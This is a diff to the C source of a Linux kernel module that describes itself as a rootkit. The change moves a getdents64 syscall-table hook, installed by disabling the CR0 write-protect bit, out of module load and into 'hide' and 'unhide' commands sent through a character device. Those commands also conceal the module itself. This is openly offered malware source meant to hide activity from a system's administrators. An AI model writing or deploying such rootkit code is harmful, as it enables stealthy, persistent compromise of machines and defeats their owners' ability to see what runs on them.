@@ -64,9 +64,8 @@ sys_getdents_t sys_getdents_original = NULL;
 int module_is_hidden = 0;
 struct list_head list_head_saved;
 struct module_kobject mkobj_saved;
-
-/* used to store any data aquired, given back during a read()- needs to be allocated */
-static char *devBuf = NULL;			
+struct list_head *module_previous;
+	
 
 /* must declare file system operations that device can perform- see linux/fs.h */
 static struct file_operations fops = {
@@ -114,10 +113,7 @@ static int __init trivial_init(void) {
 
 	
 	sys_getdents_original = (sys_getdents_t) syscall_table[__NR_getdents64];
-	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
-	syscall_table[__NR_getdents64] = sys_getdents_new;
-	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
-	
+
 		
 	printk(KERN_INFO "Registered rootkit with the kernel. Thanks kernel\n");
 
@@ -126,11 +122,6 @@ static int __init trivial_init(void) {
 
 /* function called on module removal, should reverse init function */
 static void __exit trivial_exit(void) {
-	
-	/* restore our hooked functions */
-	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
-	syscall_table[__NR_getdents64] = sys_getdents_original;
-	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
 	
 	/* unregister the device, cover our traces */
 	device_destroy(devClass, MKDEV(majorNum, 0));
@@ -184,7 +175,16 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 			}
 		} else if (strncmp(cmdPtr, "hide", 4) == SUCCESS) {
 			hide_module(&module_is_hidden);
+			/* hook syscall table */
+			write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
+			syscall_table[__NR_getdents64] = sys_getdents_new;
+			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
+
 		} else if (strncmp(cmdPtr, "unhide", 6) == SUCCESS) {
+			/* restore our hooked functions */
+			write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
+			syscall_table[__NR_getdents64] = sys_getdents_original;
+			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
 			unhide_module(&module_is_hidden);
 		}
 	}
